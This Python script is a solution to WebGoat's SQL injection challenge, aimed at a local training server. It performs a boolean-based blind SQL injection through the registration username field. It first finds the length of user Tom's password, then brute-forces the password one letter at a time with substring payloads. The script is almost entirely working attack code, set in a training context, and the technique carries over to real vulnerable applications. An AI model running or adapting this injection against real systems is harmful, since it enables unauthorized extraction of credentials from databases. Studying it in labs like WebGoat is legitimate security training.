#!/usr/bin/python3
import requests
URL = 'http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge'
#cookie = 'yourcookie' 
headers = { 'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0' , 'Cookie' : cookie}
data = { 'username_reg' : 'tom', 'email_reg' : 'jajaja@gmail.com', 'password_reg' : '123456', 'confirm_password_reg' : '123456'}

def length(payload):
    flag = True
    i = 1
    
    while flag:
        data['username_reg'] = payload + str(i) + '--' 
        r = requests.put(URL, headers=headers, data=data)         
        #DEBUG
        #print(f'Iteration number {i} {r.text}')
        if 'already exists' in r.text:
            print(f'Password length found: {i}')
            flag = False
        else:
            i = i + 1 

def crack():
    flag = True
    i = 1
    password = ['']
    for i in range(23):
        for let in 'abcdefghijklmnopqrstuvwxyz':
            data['username_reg'] = f"tom' AND substring(password,{i+1},1) = '{let}';--" 
            r = requests.put(URL, headers=headers, data=data)
            #DEBUG
            #print(f'Iteration number {i+1} {r.text}')
            if 'already exists' in r.text:
                password.append(let)
                print(f"Founded {i+1}st letter, it is {let}")
    print(f"The password for user Tom is {''.join(password)}")    

length("tom' AND length(password) = ")
crack()
